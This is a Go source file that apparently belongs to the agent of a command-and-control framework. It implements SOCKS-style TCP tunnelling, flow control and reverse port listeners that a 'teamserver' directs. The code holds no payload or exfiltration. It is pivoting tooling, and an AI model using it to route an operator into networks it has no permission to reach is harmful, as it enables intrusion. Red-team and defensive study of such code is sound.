package main

import (
	"fmt"
	"net"
	"strconv"
	"sync"
	"syscall"
	"time"
)

type tunnelChannel struct {
	id   uint32
	typ  uint32
	conn net.Conn

	mu           sync.Mutex
	cond         *sync.Cond
	closed       bool
	serverPaused bool

	queue     [][]byte
	queued    int
	pauseSent bool
}

type reverseListener struct {
	id   uint32
	port int
	ln   net.Listener
}

type tunnelManager struct {
	mu        sync.Mutex
	channels  map[uint32]*tunnelChannel
	listeners map[uint32]*reverseListener
}

func newTunnelManager() *tunnelManager {
	return &tunnelManager{
		channels:  make(map[uint32]*tunnelChannel),
		listeners: make(map[uint32]*reverseListener),
	}
}

func newTunnelChannel(id, typ uint32, conn net.Conn) *tunnelChannel {
	ch := &tunnelChannel{id: id, typ: typ, conn: conn}
	ch.cond = sync.NewCond(&ch.mu)
	return ch
}

func (tm *tunnelManager) addChannel(ch *tunnelChannel) {
	tm.mu.Lock()
	tm.channels[ch.id] = ch
	tm.mu.Unlock()
}

func (tm *tunnelManager) getChannel(id uint32) *tunnelChannel {
	tm.mu.Lock()
	defer tm.mu.Unlock()
	return tm.channels[id]
}

func (tm *tunnelManager) removeChannel(id uint32) {
	tm.mu.Lock()
	delete(tm.channels, id)
	tm.mu.Unlock()
}

func (tm *tunnelManager) addListener(l *reverseListener) {
	tm.mu.Lock()
	tm.listeners[l.id] = l
	tm.mu.Unlock()
}

func (tm *tunnelManager) closeAll() {
	tm.mu.Lock()
	chans := make([]*tunnelChannel, 0, len(tm.channels))
	for _, ch := range tm.channels {
		chans = append(chans, ch)
	}
	lns := make([]*reverseListener, 0, len(tm.listeners))
	for _, l := range tm.listeners {
		lns = append(lns, l)
	}
	tm.mu.Unlock()

	for _, l := range lns {
		_ = l.ln.Close()
	}
	for _, ch := range chans {
		ch.mu.Lock()
		ch.closed = true
		ch.cond.Broadcast()
		ch.mu.Unlock()
		_ = ch.conn.Close()
	}
}

func (a *agent) closeTunnelChannel(ch *tunnelChannel) {
	ch.mu.Lock()
	if ch.closed {
		ch.mu.Unlock()
		return
	}
	ch.closed = true
	ch.cond.Broadcast()
	ch.mu.Unlock()

	_ = ch.conn.Close()
	a.tun.removeChannel(ch.id)

	a.out.emit(func(w *writer) {
		w.u32(ch.id)
		w.u32(cmdTunnelClose)
		w.u32(ch.typ)
		w.u32(0)
	})
}

// ---------------------------------------------------------------------------
// Flow control
// ---------------------------------------------------------------------------

func (a *agent) tunnelReadLoop(ch *tunnelChannel) {
	buf := make([]byte, 32768)
	for {
		ch.mu.Lock()
		for ch.serverPaused && !ch.closed {
			ch.cond.Wait()
		}
		if ch.closed {
			ch.mu.Unlock()
			return
		}
		ch.mu.Unlock()

		n, err := ch.conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			a.out.emit(func(w *writer) {
				w.u32(ch.id)
				w.u32(cmdTunnelWriteTCP)
				w.bytes(data)
			})
		}
		if err != nil {
			break
		}
	}
	a.closeTunnelChannel(ch)
}

func (a *agent) tunnelWriteLoop(ch *tunnelChannel) {
	for {
		ch.mu.Lock()
		for len(ch.queue) == 0 && !ch.closed {
			ch.cond.Wait()
		}
		if ch.closed {
			ch.mu.Unlock()
			return
		}
		data := ch.queue[0]
		ch.queue = ch.queue[1:]
		ch.queued -= len(data)
		resume := false
		if ch.pauseSent && ch.queued < tunnelBufferLowWatermark {
			ch.pauseSent = false
			resume = true
		}
		ch.mu.Unlock()

		if resume {
			a.out.emit(func(w *writer) {
				w.u32(ch.id)
				w.u32(cmdTunnelResume)
			})
		}

		if _, err := ch.conn.Write(data); err != nil {
			a.closeTunnelChannel(ch)
			return
		}
	}
}

func (a *agent) enqueueTunnelWrite(ch *tunnelChannel, data []byte) {
	ch.mu.Lock()
	if ch.closed {
		ch.mu.Unlock()
		return
	}
	if ch.queued+len(data) > tunnelBufferHardCap {
		ch.mu.Unlock()
		a.closeTunnelChannel(ch)
		return
	}

	buf := make([]byte, len(data))
	copy(buf, data)
	ch.queue = append(ch.queue, buf)
	ch.queued += len(buf)

	pause := false
	if ch.queued > tunnelBufferHighWatermark && !ch.pauseSent {
		ch.pauseSent = true
		pause = true
	}
	ch.cond.Signal()
	ch.mu.Unlock()

	if pause {
		a.out.emit(func(w *writer) {
			w.u32(ch.id)
			w.u32(cmdTunnelPause)
		})
	}
}

// ---------------------------------------------------------------------------
// Command handlers
// ---------------------------------------------------------------------------

func tunnelStatus(id, cmd, typ, result uint32) func(*writer) {
	return func(w *writer) {
		w.u32(id)
		w.u32(cmd)
		w.u32(typ)
		w.u32(result)
	}
}

func (a *agent) cmdTunnelStartTCP(r *reader) {
	channelID := r.u32()
	tunnelType := r.u32()
	address := r.str()
	port := int(r.u32())
	_ = r.u32() // trailing task id

	go func() {
		target := net.JoinHostPort(address, strconv.Itoa(port))
		conn, err := net.DialTimeout("tcp", target, 15*time.Second)
		if err != nil {
			code := uint32(syscall.EHOSTUNREACH)
			if errnoOf(err) != 0 {
				code = uint32(errnoOf(err))
			}
			a.out.emit(tunnelStatus(channelID, cmdTunnelStartTCP, tunnelType, code))
			return
		}

		ch := newTunnelChannel(channelID, tunnelType, conn)
		a.tun.addChannel(ch)
		a.out.emit(tunnelStatus(channelID, cmdTunnelStartTCP, tunnelType, tunnelCreateSuccess))
		go a.tunnelReadLoop(ch)
		go a.tunnelWriteLoop(ch)
	}()
}

func (a *agent) cmdTunnelStartUDP(r *reader) {
	channelID := r.u32()
	address := r.str()
	_ = address
	_ = r.u32() // port
	_ = r.u32() // trailing task id

	// SOCKS5 UDP ASSOCIATE is not implemented: the teamserver only issues TCP
	// channels for SOCKS4/SOCKS5 CONNECT, and native UDP forwarding would need
	// a per-association socket map. Report EAFNOSUPPORT to the server.
	a.out.emit(tunnelStatus(channelID, cmdTunnelStartTCP, 2, uint32(syscall.EAFNOSUPPORT)))
}

func (a *agent) cmdTunnelWriteTCP(r *reader) {
	channelID := r.u32()
	data := r.bytes()
	_ = r.u32() // trailing task id

	ch := a.tun.getChannel(channelID)
	if ch == nil {
		return
	}
	a.enqueueTunnelWrite(ch, data)
}

func (a *agent) cmdTunnelWriteUDP(r *reader) {
	_ = r.u32() // channel
	_ = r.bytes()
	_ = r.u32()
}

func (a *agent) cmdTunnelPause(r *reader) {
	channelID := r.u32()
	ch := a.tun.getChannel(channelID)
	if ch == nil {
		return
	}
	ch.mu.Lock()
	ch.serverPaused = true
	ch.mu.Unlock()
}

func (a *agent) cmdTunnelResume(r *reader) {
	channelID := r.u32()
	ch := a.tun.getChannel(channelID)
	if ch == nil {
		return
	}
	ch.mu.Lock()
	ch.serverPaused = false
	ch.cond.Broadcast()
	ch.mu.Unlock()
}

func (a *agent) cmdTunnelClose(r *reader) {
	channelID := r.u32()
	_ = r.u32() // trailing task id
	ch := a.tun.getChannel(channelID)
	if ch == nil {
		return
	}
	a.closeTunnelChannel(ch)
}

func (a *agent) cmdTunnelReverse(r *reader) {
	tunnelID := r.u32()
	port := int(r.u32())
	_ = r.u32() // trailing task id

	go func() {
		ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
		if err != nil {
			a.out.emit(tunnelStatus(tunnelID, cmdTunnelReverse, tunnelTypeReverse, 0))
			return
		}

		a.tun.addListener(&reverseListener{id: tunnelID, port: port, ln: ln})
		a.out.emit(tunnelStatus(tunnelID, cmdTunnelReverse, tunnelTypeReverse, tunnelStateConnect))

		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			channelID := randomID()
			ch := newTunnelChannel(channelID, tunnelTypeReverse, conn)
			a.tun.addChannel(ch)
			a.out.emit(func(w *writer) {
				w.u32(tunnelID)
				w.u32(cmdTunnelAccept)
				w.u32(channelID)
			})
			go a.tunnelReadLoop(ch)
			go a.tunnelWriteLoop(ch)
		}
	}()
}
